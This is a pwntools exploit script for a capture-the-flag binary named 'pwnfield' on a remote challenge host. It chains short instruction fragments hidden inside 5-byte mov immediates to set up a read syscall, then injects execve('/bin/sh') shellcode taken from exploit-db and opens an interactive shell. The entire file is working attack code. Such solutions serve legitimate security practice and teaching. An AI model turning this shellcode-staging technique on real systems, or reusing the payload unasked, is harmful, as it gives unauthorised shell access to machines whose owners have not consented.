#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './pwnfield'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '0.cloud.chals.io', 21311

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    b *main+594
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1235)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./pwnfield"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='pwnfield')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    next = asm('''
        jne skip
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    skip:
        nop
    ''')[:2]
    next2 = asm('''
        je skip
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    skip:
        nop
    ''')[:2]

    MAX_INSTR = 32
    instructions = []

    code1 = asm('''
    pop rsi
    pop rsi
    ''')
    instructions.append(p8(0xbf) + code1 + next)

    code2 = asm('''
    pop rdx
    pop rsi
    ''')
    instructions.append(p8(0xbf) + code2 + next) # rdx = 0x20 & rsi = buffer

    code3 = asm('xor edi, edi')
    instructions.append(p8(0xbf) + code3 + next2) # rdi = 0

    code4 = asm('''
    syscall
    jmp rsi
    ''')
    instructions.append(p8(0xbf) + code4)

    for _ in range(4, MAX_INSTR):
        instructions.append(p8(0xbf) + p32(0x0))  # Dummy

    # Send instructions
    for i, ins in enumerate(instructions):
        io.sendafter(f"Instruction {i+1}/32 (5 bytes mov): ", ins)
    io.sendlineafter("Start execution from which instruction? ", b"0") # Start from the first
    # Shellcode from exploitdb https://www.exploit-db.com/exploits/46907
    shellcode = asm('''
        xor     rsi, rsi
        push    rsi
        movabs  rdi, 0x68732f2f6e69622f
        push    rdi
        push    rsp
        pop     rdi
        push    0x3b
        pop     rax
        cltd
        syscall
    ''')
    io.send(shellcode)
    io.interactive()

if __name__ == '__main__':
    exploit()
